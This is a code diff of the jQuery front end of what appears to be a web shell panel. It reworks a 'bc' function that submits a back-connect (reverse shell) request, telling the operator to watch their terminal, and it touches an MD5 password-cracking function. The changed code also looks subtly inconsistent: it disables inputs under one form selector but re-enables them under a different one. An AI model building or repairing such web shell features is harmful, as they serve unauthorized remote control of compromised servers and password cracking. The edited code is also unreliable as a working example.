@@ -317,24 +317,25 @@ $.ajax({
 }
 
 function bc() {
-var formData = $('#bcon').serialize();
-var btn = document.getElementById('#btn-bc');
-$.ajax({
-  type: 'POST',
-  url: '',
-  data: formData + '&aksi=backcon',
-  beforeSend: function() {
-    formData.attr('disabled', true);
-    btn.attr('disabled', true);
-    $('#output').html('<div class="alert alert-info" role="alert"><i class="fa fa-exclamation-circle me-2"></i><b>INFO : </b>Please check your Terminal for result.</div>');
-  },
-  success: function(data) {
-  $('#output').html(data);
-  formData.attr('disabled', false);
-  btn.attr('disabled', false);
-  }
-});
+    var formData = $('#bcon').serialize();
+    var btn = $('#btn-bc');
+    $.ajax({
+        type: 'POST',
+        url: '',
+        data: formData + '&aksi=backcon',
+        beforeSend: function() {
+            $('#bcon input').attr('disabled', true);
+            btn.attr('disabled', true);
+            $('#output').html('<div class="alert alert-info" role="alert"><i class="fa fa-exclamation-circle me-2"></i><b>INFO : </b>Please check your Terminal for result.</div>');
+        },
+        success: function(data) {
+            $('#output').html(data);
+            $('#bc_from input').attr('disabled', false);
+            btn.attr('disabled', false);
+        }
+    });
 }
+
 
 function deMD5() {
 var formData = $('#passlist, #md5pass').serialize();
